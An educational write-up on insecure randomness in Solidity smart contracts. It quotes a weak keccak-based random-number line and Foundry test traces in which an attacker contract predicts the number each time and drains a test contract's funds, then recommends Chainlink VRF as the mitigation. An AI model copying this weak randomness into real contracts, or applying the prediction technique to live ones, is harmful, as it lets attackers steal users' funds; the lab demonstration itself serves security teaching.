# SC09 - Insecure Randomness

Due to the deterministic nature of blockchain networks, generating secure randomness is challenging. Predictable or manipulable randomness can lead to exploitation in lotteries, token distributions, or other randomness-dependent functionalities.


In this scenario, we are dealing a Random Number Generator that uses `msg.sender`, `block.timestamp`, `block.prevrandao` and the previous block's `blockhash` to calculate a random number. You'd think this would be safe since we keep creating blocks with each transaction. However, the Blockchain is meant to be as transparent as possible, therefore, anyone could obtain all of these parameters used for getting the random number and that exactly makes it a weak randomness:
```javascript
uint256 randomNumber = uint256(keccak256(abi.encodePacked(msg.sender,block.timestamp,block.prevrandao,blockhash(block.number - 1))));
```


Simply an attacker can predict/obtain all of these parameters used for the generation of the random number, and make a correct guess each and every single time allowing him to absorb all the funds from the contract as we can see in the example below where I made a test simulating what I was just explaining with a new block and different data for each guess:
```javascript
Logs:
  guessed number: 49356039924657821959673000732456498394787809883226174800379949881564284864642
  random number: 49356039924657821959673000732456498394787809883226174800379949881564284864642
  entered
  guessed number: 96699212057113736958882739752209563968683413927149075965354076509789084162105
  random number: 96699212057113736958882739752209563968683413927149075965354076509789084162105
  entered
  guessed number: 87143961526076910101192125243346453756248698383586412687473051794627090126051
  random number: 87143961526076910101192125243346453756248698383586412687473051794627090126051
  entered
  guessed number: 61581776140332308084219501542418856096495794070990655219494790181679509889945
  random number: 61581776140332308084219501542418856096495794070990655219494790181679509889945
  entered
  guessed number: 56712033122233074682164158805050754244224922143731170028606842770132904362560
  random number: 56712033122233074682164158805050754244224922143731170028606842770132904362560
  entered

Traces:
  [94570] WorkflowTest::testAttackerCanGuessNumberCorrectlyEachTime()
    ├─ [0] VM::assertEq(5000000000000000000 [5e18], 5000000000000000000 [5e18]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    ├─ [16012] Attacker::Steal(WeakRandomness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   ├─ [0] console::log("guessed number:", 49356039924657821959673000732456498394787809883226174800379949881564284864642 [4.935e76]) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [10468] WeakRandomness::guessRandomNumber(49356039924657821959673000732456498394787809883226174800379949881564284864642 [4.935e76])
    │   │   ├─ [0] console::log("random number:", 49356039924657821959673000732456498394787809883226174800379949881564284864642 [4.935e76]) [staticcall]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [0] console::log("entered") [staticcall]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [55] Attacker::receive{value: 1000000000000000000}()
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::assertEq(4000000000000000000 [4e18], 4000000000000000000 [4e18]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(1000000000000000000 [1e18], 1000000000000000000 [1e18]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::roll(2)
    │   └─ ← [Return]
    ├─ [13512] Attacker::Steal(WeakRandomness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   ├─ [0] console::log("guessed number:", 96699212057113736958882739752209563968683413927149075965354076509789084162105 [9.669e76]) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [10468] WeakRandomness::guessRandomNumber(96699212057113736958882739752209563968683413927149075965354076509789084162105 [9.669e76])
    │   │   ├─ [0] console::log("random number:", 96699212057113736958882739752209563968683413927149075965354076509789084162105 [9.669e76]) [staticcall]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [0] console::log("entered") [staticcall]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [55] Attacker::receive{value: 1000000000000000000}()
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::roll(3)
    │   └─ ← [Return]
    ├─ [13512] Attacker::Steal(WeakRandomness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   ├─ [0] console::log("guessed number:", 87143961526076910101192125243346453756248698383586412687473051794627090126051 [8.714e76]) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [10468] WeakRandomness::guessRandomNumber(87143961526076910101192125243346453756248698383586412687473051794627090126051 [8.714e76])
    │   │   ├─ [0] console::log("random number:", 87143961526076910101192125243346453756248698383586412687473051794627090126051 [8.714e76]) [staticcall]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [0] console::log("entered") [staticcall]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [55] Attacker::receive{value: 1000000000000000000}()
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::roll(4)
    │   └─ ← [Return]
    ├─ [13512] Attacker::Steal(WeakRandomness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   ├─ [0] console::log("guessed number:", 61581776140332308084219501542418856096495794070990655219494790181679509889945 [6.158e76]) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [10468] WeakRandomness::guessRandomNumber(61581776140332308084219501542418856096495794070990655219494790181679509889945 [6.158e76])
    │   │   ├─ [0] console::log("random number:", 61581776140332308084219501542418856096495794070990655219494790181679509889945 [6.158e76]) [staticcall]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [0] console::log("entered") [staticcall]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [55] Attacker::receive{value: 1000000000000000000}()
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::roll(5)
    │   └─ ← [Return]
    ├─ [13512] Attacker::Steal(WeakRandomness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   ├─ [0] console::log("guessed number:", 56712033122233074682164158805050754244224922143731170028606842770132904362560 [5.671e76]) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [10468] WeakRandomness::guessRandomNumber(56712033122233074682164158805050754244224922143731170028606842770132904362560 [5.671e76])
    │   │   ├─ [0] console::log("random number:", 56712033122233074682164158805050754244224922143731170028606842770132904362560 [5.671e76]) [staticcall]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [0] console::log("entered") [staticcall]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [55] Attacker::receive{value: 1000000000000000000}()
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(5000000000000000000 [5e18], 5000000000000000000 [5e18]) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

```


# Mitigation 

The most general advice in this case is to just avoid using predictable values that can be obtained from the blockchain for random number generation. I would also recommend using [Chainlink's VRF (Verifiable Random Function)](https://docs.chain.link/vrf) as I have personally used this and can vouch for it! Will also make a project using it in the near future inshalah ;) 